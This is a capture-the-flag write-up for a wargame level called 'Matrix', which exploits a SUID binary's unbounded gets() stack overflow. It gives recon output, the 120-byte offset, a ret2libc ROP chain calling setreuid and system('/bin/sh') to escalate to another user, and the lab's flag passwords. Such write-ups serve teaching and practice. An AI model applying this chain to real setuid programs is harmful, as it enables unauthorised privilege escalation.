# bonus04 — "Matrix" — Un-canaried `gets()` Overflow → ret2libc

## Concept

`./matrix`, SUID owned by `flagbonus04`, home dir `/home/bonus04/`.
Fourth bonus level, and — after three genuinely new bug classes
(bonus01 heap overflow, bonus02 UAF, bonus03 dual-purpose format-string
buffer) — a return to the simplest possible primitive in the whole
project: an unbounded `gets()` into a stack buffer with no canary at
all and no PIE. Closer in spirit to the very first ret2libc level
(level05) than to anything in the bonus track so far.

## Recon

Login: `ssh bonus04@127.0.0.1 -p 4244`, password = bonus03's flag
(`mrc2jp0jsvklrfhjsh5uuwmk26yzyxgq`).

No source provided. `ls -la ~`: SUID binary `matrix`, owned by
`flagbonus04`, same pwndbg `.gdbinit` as the other bonus levels.

`getent passwd flagbonus04` → uid 1031.

`checksec ./matrix` (on the VM):
```
RELRO:      No RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
No canary and no PIE are both new relative to every earlier bonus
level (bonus01-03 all had PIE; bonus02/03 had canaries). SHSTK/IBT
still show up in `checksec`'s output but were already established as
inert on this VM (bonus02's recon — a VM-wide hardware/kernel property,
not worth re-checking per-binary).

`nm ./matrix`: `djb2`, `init_table`, `insert`, `lookup`,
`handle_input`, `print_banner`, `main`. `objdump -T` shows no
`setreuid`/`geteuid`/`system` imports at all — same absence pattern as
bonus03's `sendai`.

### Disassembling `main` / `handle_input`

`main()`: `init_table()`, `print_banner()`, `handle_input()` — no
`setreuid` anywhere, matching the import list. `handle_input()`:
```c
char cmdbuf[112];                 // rbp-0x70, frame is sub rsp,0xb0
printf("[MATRIX] Command (GET/SET): "); fflush(stdout);
gets(cmdbuf);                      // UNBOUNDED -- the bug, no canary check follows it either
if (strncmp(cmdbuf, "GET:", 4)==0) { ... calls lookup() ... }
else if (strncmp(cmdbuf, "SET:", 4)==0) { ... calls insert() ... }
else puts("[MATRIX] Unknown command.");
```
`init_table`/`insert`/`lookup`/`djb2` implement a small fixed-capacity
(16-slot) hash table (djb2 hash of the key), fully explored via
disassembly as a possible red herring before concluding it's genuinely
irrelevant here: `gets(cmdbuf)` is ALREADY an unbounded, un-canaried
overflow of the same buffer whose first bytes get `strncmp`-checked for
"GET:"/"SET:" — the overflow fires before that comparison, or the
comparison result doesn't matter once the return address itself is
already overwritten by the same `gets()` call. No need to ever reach
`insert`/`lookup` at all for this exploit.

## Retrieving the addresses, command by command

`checksec` already answers whether a leak stage is needed: "No canary
found" means the return address can be overwritten directly, no
leak-and-verify step required. Offset arithmetic from the
disassembly: buffer at `rbp-0x70`, return address at `rbp+8`, so
`0x70 + 8 = 0x78` (120) bytes of junk precede the ROP chain. No PIE to
defeat either (fixed `0x400000` base), though that isn't actually
needed since the exploit only calls into libc, whose base is the same
fixed `0x7ffff7c00000` used throughout this project
(`randomize_va_space=0`). This is the first bonus level needing zero
leak of any kind — one `gets()` call is the entire attack surface.

`matrix` has no `setreuid`/`geteuid` imports either (confirmed via
`objdump -T`, same as bonus03's `sendai`), so the
`setreuid(flagbonus04_uid, flagbonus04_uid)` step was built into the
chain from the very first attempt, using `flagbonus04`'s already-known
uid (`1031`, from `getent passwd`) directly — see bonus03 for why
`dash` requires this.

Alignment fixup: swept `n_extra_ret` in `{0, 1, 2, 3}` directly
against the real SUID target (cheap enough for a single-shot, no-leak
exploit). `n_extra_ret = 1` worked on the first sweep, consistent with
the value used throughout this project (level03/06/07/09/10, bonus03).

## Exploit

Single `gets()` call, no interactive multi-stage session needed (no
per-process-random value to preserve across calls):

```
120 bytes junk
+ pop rdi ; ret            -> 1031
+ pop rsi ; pop rbp ; ret  -> 1031, 0
+ setreuid
+ pop rdi ; ret            -> "/bin/sh"
+ ret                       (1 alignment fixup)
+ system
```

```
$ python3 exploit.py
[MATRIX] Command (GET/SET): uid=1031(flagbonus04) gid=1017(bonus04) groups=1017(bonus04),1001(levelgroup)
d2wlrk7cuuruus7iwfayjdjaiwagj7dl
```

Verified this string works as `bonus05`'s SSH password.

